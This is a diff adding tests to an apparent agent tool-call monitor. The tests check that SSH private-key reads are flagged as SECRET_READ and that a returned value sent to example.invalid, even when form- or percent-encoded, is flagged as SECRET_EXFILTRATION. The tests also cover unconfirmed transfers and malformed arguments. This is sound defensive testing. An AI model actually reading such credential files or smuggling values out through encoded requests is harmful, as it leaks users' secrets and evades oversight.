@@ -161,3 +161,37 @@ test('violations retain the refused call and pass the frozen evidence schema wit
   expect(history).toEqual(before)
   expect(result.every(({ args, tool }) => tool === 'transfer' && args.amount === '11' && args.to === OUTSIDE)).toBe(true)
 })
+
+test.each([null, [], 'invalid', 42])('malformed argument envelope %j preserves earlier evidence', (args) => {
+  const malformed = { tool: 'http_request', args } as unknown as ToolCall
+  expect(rules([transfer(), malformed])).toEqual(['TRANSFER_WITHOUT_CONFIRMATION'])
+  expect(() => respondTo(malformed, context, {})).toThrow()
+})
+
+test('a transfer with a malformed envelope remains refused and keeps its raw arguments as evidence', () => {
+  const malformed = { tool: 'transfer', args: null } as unknown as ToolCall
+  const result = findViolations([malformed], context)
+  expect(result.map(({ rule }) => rule)).toContain('TRANSFER_WITHOUT_CONFIRMATION')
+  expect(result[0]?.args).toEqual({ invalidArgs: null })
+  expect(result.every((violation) => Violation.safeParse(violation).success)).toBe(true)
+})
+
+test.each(['form-body', 'form-query', 'lowercase-percent', 'malformed-neighbor'])
+  ('conventional HTTP encoding %s cannot hide a prior returned value', (format) => {
+    const result = 'sandbox value/+&', form = new URLSearchParams({ data: result }).toString()
+    const body = format === 'lowercase-percent' ? encodeURIComponent(result).toLowerCase()
+      : format === 'malformed-neighbor' ? `%zz&${form}` : form
+    const args = format === 'form-query' ? { url: `https://example.invalid/?${form}` }
+      : { url: 'https://example.invalid', body }
+    expect(rules([{ tool: 'read_env', args: { name: 'LANG' }, result }, { tool: 'http_request', args }]))
+      .toEqual(['SECRET_EXFILTRATION'])
+  })
+
+test.each(['/home/sandbox/.ssh/id_rsa', '/Users/sandbox/.ssh/id_ed25519', 'C:\\Users\\sandbox\\.ssh\\id_rsa'])
+  ('absolute SSH credential path %s is a secret read', (path) => {
+    expect(rules([{ tool: 'read_file', args: { path } }])).toEqual(['SECRET_READ'])
+  })
+
+test('a similarly named non-SSH directory is not treated as a credential read', () => {
+  expect(rules([{ tool: 'read_file', args: { path: '/docs/.ssh-examples/README.md' } }])).toEqual([])
+})
